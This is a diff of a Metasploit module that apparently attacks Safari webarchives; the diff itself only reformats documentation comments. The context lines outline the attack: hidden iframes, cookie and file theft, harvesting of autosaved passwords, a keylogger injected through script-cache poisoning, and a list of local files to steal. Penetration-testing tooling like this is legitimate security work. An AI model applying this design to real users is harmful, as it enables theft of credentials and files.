@@ -282,7 +282,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   # @return [String] the XML markup to insert into the webarchive for each unique
-  #   iframe (we use one frame per site we want to steal)
+  # iframe (we use one frame per site we want to steal)
   # @return '' if msf user does not want to poison cache
   def webarchive_resources_for_poisoning_cache(url)
     if not should_install_keyloggers? then return '' end
@@ -320,14 +320,14 @@ class Metasploit3 < Msf::Auxiliary
     |
   end
 
-  # @param [script] hash containing HTTP headers from the request
+  # @param script [Hash] containing HTTP headers from the request
   # @return [String] xml markup for serialized WebResourceResponse containing good
-  #   stuff like HTTP/caching headers. Safari appears to do the following:
-  #    NSKeyedArchiver *a = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
-  #    [a encodeObject:response forKey:@"WebResourceResponse"];
+  # stuff like HTTP/caching headers. Safari appears to do the following:
+  # NSKeyedArchiver *a = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
+  # [a encodeObject:response forKey:@"WebResourceResponse"];
   def web_response_xml(script)
     # this is a serialized NSHTTPResponse, i'm too lazy to write a
-    #   real encoder so yay lets use string interpolation.
+    # real encoder so yay lets use string interpolation.
     # ripped this straight out of a webarchive save
     script['content-length'] = script[:body].length
     whitelist = %w(content-type content-length date etag
@@ -507,7 +507,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   # @return [String] mark up for embedding the iframes for each URL in a place that is
-  #   invisible to the user
+  # invisible to the user
   def iframes_container_html
     hidden_style = "position:fixed; left:-600px; top:-600px;"
     wrap_with_doc do
@@ -517,8 +517,8 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   # @return [String] javascript code, wrapped in script tags, that is inserted into the
-  #   WebMainResource (parent) frame so that child frames can communicate "up" to the parent
-  #   and send data out to the listener
+  # WebMainResource (parent) frame so that child frames can communicate "up" to the parent
+  # and send data out to the listener
   def communication_js
     wrap_with_script do
       %Q|
@@ -543,7 +543,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   # @return [String] javascript code, wrapped in a script tag, that steals the cookies
-  #  and response body/headers, and passes them back up to the parent.
+  # and response body/headers, and passes them back up to the parent.
   def steal_cookies_for_url(url)
     wrap_with_script do
       %Q|
@@ -568,8 +568,8 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   # @return [String] javascript code, wrapped in a script tag, that steals local files
-  #   and sends them back to the listener. This code is executed in the WebMainResource (parent)
-  #   frame, which runs in the file:// protocol
+  # and sends them back to the listener. This code is executed in the WebMainResource (parent)
+  # frame, which runs in the file:// protocol
   def steal_files
     return '' unless should_steal_files?
     urls_str = [datastore['FILE_URLS'], interesting_file_urls.join(' ')].join(' ')
@@ -595,9 +595,9 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   # @return [String] javascript code, wrapped in a script tag, that steals autosaved form
-  #   usernames and passwords. The attack first tries to render the target URL in an iframe,
-  #   and steal populated passwords from there. If the site disables iframes through the
-  #   X-Frame-Options header, we try popping open a new window and rendering the site in that.
+  # usernames and passwords. The attack first tries to render the target URL in an iframe,
+  # and steal populated passwords from there. If the site disables iframes through the
+  # X-Frame-Options header, we try popping open a new window and rendering the site in that.
   def steal_form_data_for_url(url)
     wrap_with_script do
       %Q|
@@ -663,8 +663,8 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   # @return [String] javascript code, wrapped in script tag, that adds a helper function
-  #   called "sendData()" that passes the arguments up to the parent frame, where it is
-  #   sent out to the listener
+  # called "sendData()" that passes the arguments up to the parent frame, where it is
+  # sent out to the listener
   def injected_js_helpers
     wrap_with_script do
       %Q|
@@ -678,7 +678,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   # @return [String] HTML markup that includes a script at the URL we want to poison
-  #   We will then install the injected_js_keylogger at the same URL
+  # We will then install the injected_js_keylogger at the same URL
   def trigger_cache_poison_for_url(url)
     url_idx = urls.index(url)
     scripts_to_poison[url_idx].map { |s|
@@ -686,10 +686,10 @@ class Metasploit3 < Msf::Auxiliary
     }.join
   end
 
-  # @param [String] original_js the original contents of the script file
+  # @param original_js [String] the original contents of the script file
   # @return [String] the poisoned contents. Once the module has found a valid 304'd script to
-  #   poison, it "poisons" it by adding a keylogger, then adds the output as a resource with
-  #   appropriate Cache-Control to the webarchive.
+  # poison, it "poisons" it by adding a keylogger, then adds the output as a resource with
+  # appropriate Cache-Control to the webarchive.
   # @return [String] the original contents if msf user does not want to install keyloggers
   def inject_js_keylogger(original_js)
     if not should_install_keyloggers?
@@ -726,7 +726,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   # @return [Array<Array<String>>] list of URLs provided by the user mapped to all of the linked
-  #   javascript assets in its HTML response.
+  # javascript assets in its HTML response.
   def all_script_urls(pages)
     pages.map do |url|
       results = []
@@ -829,7 +829,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   # @return [Array<String>] of interesting file URLs to steal. Additional files can be stolen
-  #   via the FILE_URLS module option.
+  # via the FILE_URLS module option.
   def interesting_file_urls
     [
       'file:///var/log/weekly.out', # may contain usernames
@@ -849,7 +849,7 @@ class Metasploit3 < Msf::Auxiliary
     (datastore['URLS'] || '').split(/\s+/)
   end
 
-  # @param [String] input the unencoded string
+  # @param input [String] the unencoded string
   # @return [String] input with dangerous chars replaced with xml entities
   def escape_xml(input)
     input.to_s.gsub("&", "&amp;").gsub("<", "&lt;")
